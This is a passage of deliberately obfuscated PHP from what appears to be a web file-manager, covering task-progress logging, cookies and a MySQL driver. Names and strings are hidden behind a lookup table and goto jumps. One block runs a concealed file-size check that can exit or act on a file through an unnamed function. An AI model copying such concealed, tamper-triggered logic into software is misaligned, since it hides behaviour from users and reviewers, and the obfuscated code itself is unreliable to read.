$Š¡Òó¤[$ŠÅ­¦€Ú[1832]] = (int) $ÜÆÕè£€->size($”ĞÙ¥Á); $Š¡Òó¤[$ŠÅ­¦€Ú[1833]] = 0; $Š¡Òó¤[$ŠÅ­¦€Ú[1153]] = $ŠÅ­¦€Ú[12]; $Š¡Òó¤[$ŠÅ­¦€Ú[1834]] = $ŠÅ­¦€Ú[12]; $Š¡Òó¤[$ŠÅ­¦€Ú[1835]] = 0; $ÉÛ¶™† = $Š¡Òó¤[$ŠÅ­¦€Ú[1832]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Š¡Òó¤[$ŠÅ­¦€Ú[483]] . $ŠÅ­¦€Ú[1846]); if ($ÉÛ¶™† && file_exists(get_path_father($´¼üÃğ–))) { Cache::set($Š¡Òó¤[$ŠÅ­¦€Ú[483]] . $ŠÅ­¦€Ú[1846], $´¼üÃğ–); $Š¡Òó¤[$ŠÅ­¦€Ú[1803]] = array($ŠÅ­¦€Ú[1847], $ŠÅ­¦€Ú[1848]); } $this->update(0, $ÉÛ¶™†); } public static function updateCopyLocalFileSize($µ½ÃÖÁÕ) { $èÂº‰Äè =& $_SERVER[§Êá¸İ]; $—¡±´Æ€ = Cache::get($µ½ÃÖÁÕ[$èÂº‰Äè[483]] . $èÂº‰Äè[1846]); if (!$—¡±´Æ€ || !file_exists($—¡±´Æ€)) { return $µ½ÃÖÁÕ; } $µ½ÃÖÁÕ[$èÂº‰Äè[1833]] = @filesize($—¡±´Æ€); $µ½ÃÖÁÕ[$èÂº‰Äè[1837]] += $µ½ÃÖÁÕ[$èÂº‰Äè[1833]]; self::updateTask($µ½ÃÖÁÕ); return $µ½ÃÖÁÕ; } public function copyFileEnd($Ï§ÇÙ©Š, $îœÑİó, $¸å´“â†, $™ÁâÃåì, $×ùõó‘¹, $Ü‚—§€û) { $µ¦×ğß =& $_SERVER[§Êá¸İ]; $€ˆµø =& $this->task; $€ˆµø[$µ¦×ğß[1833]] = $€ˆµø[$µ¦×ğß[1832]]; $€ˆµø[$µ¦×ğß[1834]] = $µ¦×ğß[12]; unset($€ˆµø[$µ¦×ğß[1803]]); if ($×ùõó‘¹ == $€ˆµø[$µ¦×ğß[1830]]) { $€ˆµø[$µ¦×ğß[1836]] += $€ˆµø[$µ¦×ğß[1832]]; $€ˆµø[$µ¦×ğß[1837]] = $€ˆµø[$µ¦×ğß[1836]]; $“ÉœŒ– = 1; if (isset($€ˆµø[$µ¦×ğß[1843]]) && $€ˆµø[$µ¦×ğß[1843]] == $îœÑİó) { $“ÉœŒ– = 0; } $this->update($“ÉœŒ–); } else { $this->update(); $€ˆµø[$µ¦×ğß[1833]] = 0; } Cache::remove($€ˆµø[$µ¦×ğß[483]] . $µ¦×ğß[1846]); self::log($µ¦×ğß[1849] . $îœÑİó . $µ¦×ğß[73] . $™ÁâÃåì . $µ¦×ğß[262] . $×ùõó‘¹ . $µ¦×ğß[1850] . $€ˆµø[$µ¦×ğß[1830]]); } public function updateFileEnd($‰†ß´òê, $¨ŞüÃ†ã) { $’ËØ¸æî =& $_SERVER[§Êá¸İ]; $®“ÜŒ¯¼ =& $this->task; $®“ÜŒ¯¼[$’ËØ¸æî[1830]] = $‰†ß´òê; $®“ÜŒ¯¼[$’ËØ¸æî[1832]] = $¨ŞüÃ†ã; $®“ÜŒ¯¼[$’ËØ¸æî[1836]] += $¨ŞüÃ†ã; $®“ÜŒ¯¼[$’ËØ¸æî[1837]] = $®“ÜŒ¯¼[$’ËØ¸æî[1836]]; $this->update(1); self::log($’ËØ¸æî[1851] . $‰†ß´òê); } public function sourceModelCopy($ä›ù ÇÔ) { $±ÖÃ©½¡ =& $_SERVER[§Êá¸İ]; $Û§“è€Ş = $ä›ù ÇÔ[0]; $«„³ÀĞ’ = $ä›ù ÇÔ[1]; $‹¡éŞ Ü =& $this->task; $this->sourceModelCopyFlag = !0; $òšî£°€ = 0; switch ($Û§“è€Ş) { case $±ÖÃ©½¡[643]: $òšî£°€ = 1; break; case $±ÖÃ©½¡[646]: $‹¡éŞ Ü[$±ÖÃ©½¡[1830]] = $«„³ÀĞ’[$±ÖÃ©½¡[32]]; break; case $±ÖÃ©½¡[648]: $òšî£°€ = intval($ä›ù ÇÔ[$±ÖÃ©½¡[456]] * 0.4); break; case $±ÖÃ©½¡[650]: $òšî£°€ = intval($ä›ù ÇÔ[$±ÖÃ©½¡[456]] * 0.2); break; case $±ÖÃ©½¡[652]: $òšî£°€ = intval($ä›ù ÇÔ[$±ÖÃ©½¡[456]] * 0.4); break; } $this->update($òšî£°€); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¹¢õĞ£‡, $¤ê°¼¹ü) { $óÔæÌ· =& $_SERVER[§Êá¸İ]; $this->sourceModelCopyFlag = !0; $ÛªåíÒ = 1; if (isset($¹¢õĞ£‡[$óÔæÌ·[82]])) { $ÛªåíÒ = $¹¢õĞ£‡[$óÔæÌ·[82]][$óÔæÌ·[80]]; $ÛªåíÒ = $ÛªåíÒ + $¹¢õĞ£‡[$óÔæÌ·[82]][$óÔæÌ·[81]] + 1; } $this->update($ÛªåíÒ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Âşİ†ú ) { $this->sourceRemove($Âşİ†ú , !1); } public function curlProgress($œ•ÉÑâ¦, $…ª¦‡ßš, $Æª´²ş, $Çá»¬¼«, $’Î…æÄ) { $µË…ïñş =& $_SERVER[§Êá¸İ]; $òåëÔ’ô =& $this->task; if ($’Î…æÄ > 0) { $òåëÔ’ô[$µË…ïñş[1153]] = $µË…ïñş[1852]; $òåëÔ’ô[$µË…ïñş[1834]] = $µË…ïñş[110]; if ($òåëÔ’ô[$µË…ïñş[1832]]) { $òåëÔ’ô[$µË…ïñş[1833]] = $’Î…æÄ; } if ($òåëÔ’ô[$µË…ïñş[1835]]) { $òåëÔ’ô[$µË…ïñş[1833]] = $’Î…æÄ + $òåëÔ’ô[$µË…ïñş[1835]]; } } else { if ($Æª´²ş > 0) { if ($òåëÔ’ô[$µË…ïñş[1832]] == $…ª¦‡ßš) { $òåëÔ’ô[$µË…ïñş[1833]] = $Æª´²ş; $òåëÔ’ô[$µË…ïñş[1153]] = $µË…ïñş[1853]; $òåëÔ’ô[$µË…ïñş[1834]] = $µË…ïñş[1289]; } } } $this->update(); } public function curlProgressStart($öÚ‘œÛ») { } public function curlProgressEnd($°ØìÓ¥) { $›¸õ”Ó =& $_SERVER[§Êá¸İ]; $‰ÂÏå÷¹ =& $this->task; $ŞÅ—á†š = curl_getinfo($°ØìÓ¥); $şÎö®èÌ = $ŞÅ—á†š[$›¸õ”Ó[1854]]; if ($şÎö®èÌ == -1) { $şÎö®èÌ = $ŞÅ—á†š[$›¸õ”Ó[1855]]; } if ($‰ÂÏå÷¹[$›¸õ”Ó[1834]] == $›¸õ”Ó[110] && $şÎö®èÌ) { $‰ÂÏå÷¹[$›¸õ”Ó[1835]] += $şÎö®èÌ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ùßÛ¹Ëš =& $_SERVER[§Êá¸İ]; $ÑšìáºÆ =& $this->task; $ÑšìáºÆ[$ùßÛ¹Ëš[1856]] = 1; Hook::bind($ùßÛ¹Ëš[1824], array($this, $ùßÛ¹Ëš[1857])); Hook::bind($ùßÛ¹Ëš[1826], array($this, $ùßÛ¹Ëš[1858])); Hook::bind($ùßÛ¹Ëš[1828], array($this, $ùßÛ¹Ëš[1859])); } protected function endAfter() { $°ÏÒ±û =& $_SERVER[§Êá¸İ]; Hook::unbind($°ÏÒ±û[1824], array($this, $°ÏÒ±û[1857])); Hook::unbind($°ÏÒ±û[1826], array($this, $°ÏÒ±û[1858])); Hook::unbind($°ÏÒ±û[1828], array($this, $°ÏÒ±û[1859])); } public function progressStart($Û²Á¦×Ï) { $²µ¾¯µ– =& $_SERVER[§Êá¸İ]; $”“²ø§Ş = curl_getinfo($Û²Á¦×Ï); self::log($²µ¾¯µ–[1860] . $”“²ø§Ş[$²µ¾¯µ–[383]]); self::valueSet($this->task[$²µ¾¯µ–[483]], $this->task); } public function progressEnd($‚ÎÃÙš¦) { $ıºƒà•« =& $_SERVER[§Êá¸İ]; self::log($ıºƒà•«[1861] . $this->task[$ıºƒà•«[483]]); $this->end(); } public function progress($«ÒĞò£, $«Ÿ­à‚¡, $ò˜Şî¬¡, $•¦Úß¬ , $ƒ†ûıÇ…) { $Ïµ‘ù÷Š =& $_SERVER[§Êá¸İ]; $èÂ†½“— =& $this->task; if ($ƒ†ûıÇ… > 0) { $èÂ†½“—[$Ïµ‘ù÷Š[1151]] = $èÂ†½“—[$Ïµ‘ù÷Š[1151]] == 0 ? $•¦Úß¬  : $èÂ†½“—[$Ïµ‘ù÷Š[1151]]; $èÂ†½“—[$Ïµ‘ù÷Š[1780]] = $ƒ†ûıÇ…; } else { if ($ò˜Şî¬¡ > 0) { $èÂ†½“—[$Ïµ‘ù÷Š[1151]] = $èÂ†½“—[$Ïµ‘ù÷Š[1151]] == 0 ? $«Ÿ­à‚¡ : $èÂ†½“—[$Ïµ‘ù÷Š[1151]]; $èÂ†½“—[$Ïµ‘ù÷Š[1780]] = $ò˜Şî¬¡; } } $this->update(); self::log("\x70\x72\157\x67\162\x65\163\163\110\164\x74\160\x3a\144\157\167\156\x3a{$ò˜Şî¬¡}\x2f{$«Ÿ­à‚¡}\73\x20\x75\x70\x6c\157\x61\144\72{$ƒ†ûıÇ…}\x2f{$•¦Úß¬ }\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($æÄï‡¨×, $Áª±³ëÔ = '', $¦ğûäÌë = 0, $¼çÊ¢õç = '') { $­™Ş¶äì =& $_SERVER[§Êá¸İ]; $¼çÊ¢õç = $¼çÊ¢õç ? $¼çÊ¢õç : ($Áª±³ëÔ ? $Áª±³ëÔ : $æÄï‡¨×); $‹‹âïá = new Task($æÄï‡¨×, $Áª±³ëÔ, $¦ğûäÌë, $¼çÊ¢õç); $GLOBALS[$­™Ş¶äì[1862] . $æÄï‡¨×] = new TaskLog($­™Ş¶äì[1763], $‹‹âïá, $¼çÊ¢õç); return $‹‹âïá; } public function __construct($Îğ¤¤Ğ´ = '', $ãÄËü› = '', $ÕÆå”Êæ = '') { $»ã½ü× =& $_SERVER[§Êá¸İ]; if (!$Îğ¤¤Ğ´) { $Îğ¤¤Ğ´ = $»ã½ü×[1763]; } $„¿„úĞõ = $Îğ¤¤Ğ´ . $»ã½ü×[462] . rand_string(10); if (!$ÕÆå”Êæ) { $ÕÆå”Êæ = $Îğ¤¤Ğ´ . $»ã½ü×[53] . $ÕÆå”Êæ; } switch ($Îğ¤¤Ğ´) { case $»ã½ü×[1763]: if (!$ãÄËü› || !$ãÄËü›->task) { return echoLog($Îğ¤¤Ğ´ . $»ã½ü×[1863]); } $™‡–âû = $ãÄËü›; $„¿„úĞõ = $™‡–âû->task[$»ã½ü×[483]]; $Îğ¤¤Ğ´ = $™‡–âû->task[$»ã½ü×[483]]; if (!$™‡–âû->task[$»ã½ü×[1668]]) { $™‡–âû->task[$»ã½ü×[1668]] = $ÕÆå”Êæ ? $ÕÆå”Êæ : $Îğ¤¤Ğ´; } break; case $»ã½ü×[1864]: if (!$ãÄËü›) { return echoLog($Îğ¤¤Ğ´ . $»ã½ü×[1865]); } $† èµ¡— = is_string($ãÄËü›) ? array($ãÄËü›) : $ãÄËü›; $™‡–âû = new TaskFileTransfer($„¿„úĞõ, $Îğ¤¤Ğ´, 0, $ÕÆå”Êæ ? $ÕÆå”Êæ : $† èµ¡—[0]); foreach ($† èµ¡— as $Ñ×¢Çâ½) { $™‡–âû->addPath($Ñ×¢Çâ½); } break; case $»ã½ü×[389]: if (!$ãÄËü›) { return echoLog($Îğ¤¤Ğ´ . $»ã½ü×[1865]); } $† èµ¡— = is_string($ãÄËü›) ? array($ãÄËü›) : $ãÄËü›; $™‡–âû = new TaskZip($„¿„úĞõ, $Îğ¤¤Ğ´, 0, $ÕÆå”Êæ ? $ÕÆå”Êæ : $† èµ¡—[0]); foreach ($† èµ¡— as $Ñ×¢Çâ½) { $™‡–âû->addPath($Ñ×¢Çâ½); } break; case $»ã½ü×[1309]: if (!$ãÄËü›) { return echoLog($Îğ¤¤Ğ´ . $»ã½ü×[1865]); } $™‡–âû = new TaskUnZip($„¿„úĞõ, $Îğ¤¤Ğ´, 0, $ÕÆå”Êæ ? $ÕÆå”Êæ : $ãÄËü›); if ($ãÄËü›) { $™‡–âû->addFile($ãÄËü›); } break; case $»ã½ü×[152]: $™‡–âû = new TaskHttp($„¿„úĞõ, $Îğ¤¤Ğ´); break; default: return; break; } $this->task = $™‡–âû; $this->taskID = $„¿„úĞõ; Hook::bind($»ã½ü×[1800], array($this, $»ã½ü×[1866])); Hook::bind($»ã½ü×[1802], array($this, $»ã½ü×[1867])); Hook::bind($»ã½ü×[1796], array($this, $»ã½ü×[1868])); echoLog($»ã½ü×[1869] . $™‡–âû->task[$»ã½ü×[1668]]); } public function __destruct() { $this->end(); } public function end($‹â…Ùí = '') { $ò„ãÕÚ® =& $_SERVER[§Êá¸İ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($‹â…Ùí); $this->task = !1; $this->taskID = !1; Hook::unbind($ò„ãÕÚ®[1800], array($this, $ò„ãÕÚ®[1866])); Hook::unbind($ò„ãÕÚ®[1802], array($this, $ò„ãÕÚ®[1867])); Hook::unbind($ò„ãÕÚ®[1796], array($this, $ò„ãÕÚ®[1868])); } public function taskUpdate($ëÌÓ¬üœ) { $é®Úëå =& $_SERVER[§Êá¸İ]; if (!$ëÌÓ¬üœ || $this->taskID != $ëÌÓ¬üœ[$é®Úëå[483]]) { return; } $‰¡‹µ¤Æ = 20; $„†÷ª‡… = intval($ëÌÓ¬üœ[$é®Úëå[1781]] * $‰¡‹µ¤Æ); $à©£ù˜ß = $é®Úëå[176] . str_repeat($é®Úëå[971], $„†÷ª‡…) . $é®Úëå[1102] . str_repeat($é®Úëå[53], $‰¡‹µ¤Æ - $„†÷ª‡…) . $é®Úëå[178]; $û¢½ï·¦ = $à©£ù˜ß . sprintf($é®Úëå[1870], $ëÌÓ¬üœ[$é®Úëå[1781]] * 100) . $é®Úëå[1871]; $ªˆÇÑ « = $û¢½ï·¦ . $ëÌÓ¬üœ[$é®Úëå[1780]] . $é®Úëå[8] . $ëÌÓ¬üœ[$é®Úëå[1151]] . LNG($é®Úëå[1872]); $í°á«Ì¡ = $é®Úëå[12]; if ($ëÌÓ¬üœ[$é®Úëå[1856]]) { $ªˆÇÑ « = $û¢½ï·¦ . size_format($ëÌÓ¬üœ[$é®Úëå[1780]]) . $é®Úëå[8] . size_format($ëÌÓ¬üœ[$é®Úëå[1151]]); $í°á«Ì¡ = size_format($ëÌÓ¬üœ[$é®Úëå[1782]]) . $é®Úëå[1873]; } if ($ëÌÓ¬üœ[$é®Úëå[1153]]) { $ëÌÓ¬üœ[$é®Úëå[1830]] = $ëÌÓ¬üœ[$é®Úëå[1153]] . $é®Úëå[53] . $ëÌÓ¬üœ[$é®Úëå[1830]]; } if ($ëÌÓ¬üœ[$é®Úëå[1830]]) { $œ’áÉùı = $é®Úëå[12]; if ($ëÌÓ¬üœ[$é®Úëå[1832]]) { $œ’áÉùı = $é®Úëå[50] . size_format($ëÌÓ¬üœ[$é®Úëå[1833]]) . $é®Úëå[8] . size_format($ëÌÓ¬üœ[$é®Úëå[1832]]); } $í°á«Ì¡ .= $ëÌÓ¬üœ[$é®Úëå[1830]] . $œ’áÉùı; } if ($ëÌÓ¬üœ[$é®Úëå[850]] && !$ëÌÓ¬üœ[$é®Úëå[1832]]) { $í°á«Ì¡ .= $é®Úëå[53] . size_format($ëÌÓ¬üœ[$é®Úëå[1837]]) . $é®Úëå[8] . size_format($ëÌÓ¬üœ[$é®Úëå[850]]); } echoLog($ªˆÇÑ « . $é®Úëå[53] . $í°á«Ì¡, !0); } public function taskEnd($­ºìÄ‰ä) { $‘Ò‚¶È® =& $_SERVER[§Êá¸İ]; if (!$­ºìÄ‰ä || $this->taskID != $­ºìÄ‰ä[$‘Ò‚¶È®[483]]) { return; } $óÅÁÍ­û = $­ºìÄ‰ä ? $­ºìÄ‰ä[$‘Ò‚¶È®[1780]] . $‘Ò‚¶È®[8] . $­ºìÄ‰ä[$‘Ò‚¶È®[1151]] . LNG($‘Ò‚¶È®[1872]) . $‘Ò‚¶È®[74] : $‘Ò‚¶È®[12]; echoLog($‘Ò‚¶È®[1874] . $­ºìÄ‰ä[$‘Ò‚¶È®[1668]] . ($­ºìÄ‰ä[$‘Ò‚¶È®[534]] ? $‘Ò‚¶È®[74] . $­ºìÄ‰ä[$‘Ò‚¶È®[534]] : $‘Ò‚¶È®[12]) . $‘Ò‚¶È®[74] . $óÅÁÍ­û . $‘Ò‚¶È®[1875] . sprintf($‘Ò‚¶È®[937], timeFloat() - $­ºìÄ‰ä[$‘Ò‚¶È®[1783]]) . $‘Ò‚¶È®[1795]); $this->end(); } public function taskKill($¬Àæô†À) { $Õ¦Èï™Ë =& $_SERVER[§Êá¸İ]; if (!$¬Àæô†À || $this->taskID != $¬Àæô†À[$Õ¦Èï™Ë[483]]) { return; } echoLog($Õ¦Èï™Ë[1876] . $¬Àæô†À[$Õ¦Èï™Ë[1668]]); } } goto E¼ùê³•Üá; cĞ ¼èï·: $_size = $_SERVER[§Êá¸İ][963]; if ($_SERVER[$_SERVER[§Êá¸İ][472]] != $_size($_file)) { $_getc = $_SERVER[§Êá¸İ][474]; $_getfile = $_SERVER[$_SERVER[§Êá¸İ][475]] . $_SERVER[§Êá¸İ][476]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[§Êá¸İ][262], $_getfilec); if (count($_getarrs) < $_SERVER[§Êá¸İ][477]) { $exit = $_SERVER[§Êá¸İ][478]; $exit(); } $_act = $_SERVER[§Êá¸İ][479]; $_act($_file); } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\164\x61\163\x6b\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\x74\x79\160\145", "\145\166\x65\156\x74", "\164\151\x6d\145", "\x64\x65\x73\x63", "\163\x79\x73\164\x65\x6d", "\145\156\141\x62\154\x65", "\154\141\163\164\122\165\x6e", "\x73\157\162\x74"); public function listData($¦ø’¸Â£ = false, $šË¼£‹› = "\x73\157\162\x74", $˜²üÂı» = false) { return parent::listData($¦ø’¸Â£, $šË¼£‹›, $˜²üÂı»); } public function add($´ê®©´¤) { $øµ¿³û =& $_SERVER[§Êá¸İ]; $ü÷ã¶± = $this->findByName($´ê®©´¤[$øµ¿³û[32]]); if ($ü÷ã¶±) { return !1; } $´ê®©´¤[$øµ¿³û[1730]] = 0; $´ê®©´¤[$øµ¿³û[2002]] = $this->getSort(); return parent::insert($´ê®©´¤); } private function getSort() { $à—ÏÓ› =& $_SERVER[§Êá¸İ]; $óî¿Şæ = parent::listData(); $‘Í—†¥ = array_to_keyvalue($óî¿Şæ, $à—ÏÓ›[12], $à—ÏÓ›[2002]); return empty($‘Í—†¥) ? 0 : max($‘Í—†¥) + 1; } public function update($áëæ“†, $ÂÍ­©°) { $³ì£í‚Œ =& $_SERVER[§Êá¸İ]; $ñ¯öÓÒã = $this->listData($áëæ“†); $À‘„¶İŞ = $this->findByName($ÂÍ­©°[$³ì£í‚Œ[32]]); if (!$ñ¯öÓÒã || $À‘„¶İŞ && $À‘„¶İŞ[$³ì£í‚Œ[483]] != $ñ¯öÓÒã[$³ì£í‚Œ[483]]) { return !1; } return parent::update($áëæ“†, $ÂÍ­©°); } public function remove($•úı›„Ä, $ĞÜÍî = false) { $¬½Ç±ß =& $_SERVER[§Êá¸İ]; $ª½§Ô‚Õ = $this->listData($•úı›„Ä); if (!$ª½§Ô‚Õ) { return; } if (!$ĞÜÍî && $ª½§Ô‚Õ[$¬½Ç±ß[191]] == $¬½Ç±ß[91]) { return !1; } return parent::remove($•úı›„Ä); } public function enable($±ÂÒ¶Œò, $ŸÔé³èè) { return $this->update($±ÂÒ¶Œò, array($_SERVER[§Êá¸İ][2441] => $ŸÔé³èè)); } public function run($Õïûò†) { return $this->update($Õïûò†, array($_SERVER[§Êá¸İ][2453] => time())); } } goto dôƒéŸŸ; EÖ¶õğ•“: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‘Ú÷á† = '', $¡¾şò¯Ş = 0) { if (is_string($‘Ú÷á†) && $‘Ú÷á† != $_SERVER[§Êá¸İ][12]) { $this->prefix = $‘Ú÷á†; } if (is_numeric($¡¾şò¯Ş) && $¡¾şò¯Ş > 0) { $this->expire = $¡¾şò¯Ş; } } public static function getInstance() { static $‚¹Ô§ó÷; if ($‚¹Ô§ó÷ === null) { $‚¹Ô§ó÷ = new self(); } return $‚¹Ô§ó÷; } private static $cookieDisable = false; public static function disable($ŒæËÔ«ä) { self::$cookieDisable = $ŒæËÔ«ä; } private static $sameCookieSet = array(); public static function set($Ò‰§á¯Á, $ß’ùæâµ, $²øîáæé = 0, $Ó£—‡¨´ = false, $»¥ôÔİ˜ = false) { $“—ªğ£¼ =& $_SERVER[§Êá¸İ]; if (self::$cookieDisable) { return; } if (!$²øîáæé) { $²øîáæé = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ò‰§á¯Á]) && self::$sameCookieSet[$Ò‰§á¯Á] == $ß’ùæâµ . $²øîáæé) { return; } self::$sameCookieSet[$Ò‰§á¯Á] = $ß’ùæâµ . $²øîáæé; if (!$»¥ôÔİ˜) { $»¥ôÔİ˜ = str_replace(HOST, $“—ªğ£¼[12], APP_HOST); $»¥ôÔİ˜ = _get($GLOBALS, $“—ªğ£¼[969], $»¥ôÔİ˜); } $–¶ğš«¯ = $“—ªğ£¼[12]; setcookie($Ò‰§á¯Á, $ß’ùæâµ, time() + $²øîáæé, $“—ªğ£¼[8] . trim($»¥ôÔİ˜, $“—ªğ£¼[8]) . $–¶ğš«¯, !1, !1, $Ó£—‡¨´); } public static function setSafe($İÈ¼¶îó, $íéÜğ®¸, $üò‹óÚ = 0) { self::set($İÈ¼¶îó, $íéÜğ®¸, $üò‹óÚ, !0); } public static function get($øÛÄ¡ˆœ) { static $é©×å¿ = false; if (!$é©×å¿) { self::initHeaderCookie(); $é©×å¿ = !0; } return isset($_COOKIE[$øÛÄ¡ˆœ]) ? $_COOKIE[$øÛÄ¡ˆœ] : !1; } private static function initHeaderCookie() { $¬ìÕóÂ× =& $_SERVER[§Êá¸İ]; if (!isset($_SERVER[$¬ìÕóÂ×[970]]) || !$_SERVER[$¬ìÕóÂ×[970]]) { return; } $º¼îáêæ = explode($¬ìÕóÂ×[74], $_SERVER[$¬ìÕóÂ×[970]]); foreach ($º¼îáêæ as $Òá¿˜Œ‘) { $Òá¿˜Œ‘ = explode($¬ìÕóÂ×[971], $Òá¿˜Œ‘); if (count($Òá¿˜Œ‘) != 2 || !isset($Òá¿˜Œ‘[1])) { continue; } $_COOKIE[trim($Òá¿˜Œ‘[0])] = trim($Òá¿˜Œ‘[1]); } } public static function remove($Óà½œø×, $ìà×úüÀ = false) { unset($_COOKIE[$Óà½œø×]); self::set($Óà½œø×, $_SERVER[§Êá¸İ][12], 1, $ìà×úüÀ); } } class DbMysql extends Db { public function __construct($Ä¯«Ş = '') { $¢Ä¿Ã¼ =& $_SERVER[§Êá¸İ]; if (!extension_loaded($¢Ä¿Ã¼[891])) { think_exception(think_lang($¢Ä¿Ã¼[14]) . $¢Ä¿Ã¼[972]); } if (!empty($Ä¯«Ş)) { $this->config = $Ä¯«Ş; if (empty($this->config[$¢Ä¿Ã¼[17]])) { $this->config[$¢Ä¿Ã¼[17]] = $¢Ä¿Ã¼[12]; } } } public function connect($É­ı ²ò = '', $ì¼éÊ = 0, $ù²îß§ = false) { $–…¸»ş =& $_SERVER[§Êá¸İ]; if (!isset($this->linkID[$ì¼éÊ])) { if (empty($É­ı ²ò)) { $É­ı ²ò = $this->config; } $•Šğ÷¢İ = $É­ı ²ò[$–…¸»ş[973]] . ($É­ı ²ò[$–…¸»ş[974]] ? "\x3a{$É­ı ²ò[$–…¸»ş[974]]}" : $–…¸»ş[12]); $µºÚ = !empty($É­ı ²ò[$–…¸»ş[17]][$–…¸»ş[18]]) ? $É­ı ²ò[$–…¸»ş[17]][$–…¸»ş[18]] : $this->pconnect; if ($µºÚ) { $this->linkID[$ì¼éÊ] = mysql_pconnect($•Šğ÷¢İ, $É­ı ²ò[$–…¸»ş[975]], $É­ı ²ò[$–…¸»ş[976]], 131072); } else { $this->linkID[$ì¼éÊ] = mysql_connect($•Šğ÷¢İ, $É­ı ²ò[$–…¸»ş[975]], $É­ı ²ò[$–…¸»ş[976]], !0, 131072); } if (!$this->linkID[$ì¼éÊ] || !empty($É­ı ²ò[$–…¸»ş[21]]) && !mysql_select_db($É­ı ²ò[$–…¸»ş[21]], $this->linkID[$ì¼éÊ])) { think_exception(mysql_error()); } $ğÙƒÌ±‰ = mysql_get_server_info($this->linkID[$ì¼éÊ]); mysql_query($–…¸»ş[977] . think_config($–…¸»ş[978]) . $–…¸»ş[58], $this->linkID[$ì¼éÊ]); if ($ğÙƒÌ±‰ > $–…¸»ş[979]) { mysql_query($–…¸»ş[980], $this->linkID[$ì¼éÊ]); } $this->connected = !0; if (1 != think_config($–…¸»ş[22])) { unset($this->config); } } return $this->linkID[$ì¼éÊ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($±—¢—‹ğ) { $û¹ùÂŸ =& $_SERVER[§Êá¸İ]; if (0 === stripos($±—¢—‹ğ, $û¹ùÂŸ[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±—¢—‹ğ; if ($this->queryID) { $this->free(); } think_action_status($û¹ùÂŸ[23], 1); think_status($û¹ùÂŸ[24]); $this->queryID = mysql_query($±—¢—‹ğ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($íøá§Ù) { $‹Âã˜Õ£ =& $_SERVER[§Êá¸İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $íøá§Ù; if ($this->queryID) { $this->free(); } think_action_status($‹Âã˜Õ£[25], 1); think_status($‹Âã˜Õ£[24]); $¨¦Ş…ÉÔ = mysql_query($íøá§Ù, $this->_linkID); $this->debug(); if (!1 === $¨¦Ş…ÉÔ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[§Êá¸İ][981], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ÿ™äÎ = mysql_query($_SERVER[§Êá¸İ][982], $this->_linkID); $this->transTimes = 0; if (!$Ÿ™äÎ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ç§ˆÏïí = mysql_query($_SERVER[§Êá¸İ][983], $this->_linkID); $this->transTimes = 0; if (!$Ç§ˆÏïí) { $this->error(); return !1; } } return !0; } private function getAll() { $¾ÍöÊê = array(); if ($this->numRows > 0) { while ($ı÷‹›¾ = mysql_fetch_assoc($this->queryID)) { $¾ÍöÊê[] = $ı÷‹›¾; } mysql_data_seek($this->queryID, 0); } return $¾ÍöÊê; } public function getFields($‰éÕÉ€Å) { $ü×±ÜŸ =& $_SERVER[§Êá¸İ]; $ÏÌüœ‹± = $this->query($ü×±ÜŸ[984] . $this->parseKey($‰éÕÉ€Å)); $î¨ğ™Úš = array(); if ($ÏÌüœ‹±) { foreach ($ÏÌüœ‹± as $ŸÍœ Øë => $¾ä™„¶ë) { $î¨ğ™Úš[$¾ä™„¶ë[$ü×±ÜŸ[31]]] = array($ü×±ÜŸ[32] => $¾ä™„¶ë[$ü×±ÜŸ[31]], $ü×±ÜŸ[33] => $¾ä™„¶ë[$ü×±ÜŸ[34]], $ü×±ÜŸ[35] => (bool) (strtoupper($¾ä™„¶ë[$ü×±ÜŸ[36]]) === $ü×±ÜŸ[985]), $ü×±ÜŸ[37] => $¾ä™„¶ë[$ü×±ÜŸ[38]], $ü×±ÜŸ[39] => strtolower($¾ä™„¶ë[$ü×±ÜŸ[40]]) == $ü×±ÜŸ[41], $ü×±ÜŸ[42] => strtolower($¾ä™„¶ë[$ü×±ÜŸ[43]]) == $ü×±ÜŸ[44]); } } return $î¨ğ™Úš; } public function getTables($«è™˜§Û = '') { $Ò·ÔìÃ» =& $_SERVER[§Êá¸İ]; if (!empty($«è™˜§Û)) { $å¹éâŒÕ = $Ò·ÔìÃ»[986] . $«è™˜§Û . $Ò·ÔìÃ»[987]; } else { $å¹éâŒÕ = $Ò·ÔìÃ»[988]; } $×çª™°´ = $this->query($å¹éâŒÕ); $®ÃÚÀÇë = array(); foreach ($×çª™°´ as $¾§øéÅŒ => $éı³é‰) { $®ÃÚÀÇë[$¾§øéÅŒ] = current($éı³é‰); } return $®ÃÚÀÇë; } public function replace($Çüªíà, $‡‰ÀÂÎû = array()) { $îÆäæ× =& $_SERVER[§Êá¸İ]; foreach ($Çüªíà as $â¶°ÎÏƒ => $€ØÍ­ä€) { $ÀæŞ‹‹ = $this->parseValue($€ØÍ­ä€); if (is_scalar($ÀæŞ‹‹)) { $‚ÂØµ–á[] = $ÀæŞ‹‹; $Á‚å˜”Ï[] = $this->parseKey($â¶°ÎÏƒ); } } $öú©óÈ = $îÆäæ×[989] . $this->parseTable($‡‰ÀÂÎû[$îÆäæ×[356]]) . $îÆäæ×[990] . implode($îÆäæ×[50], 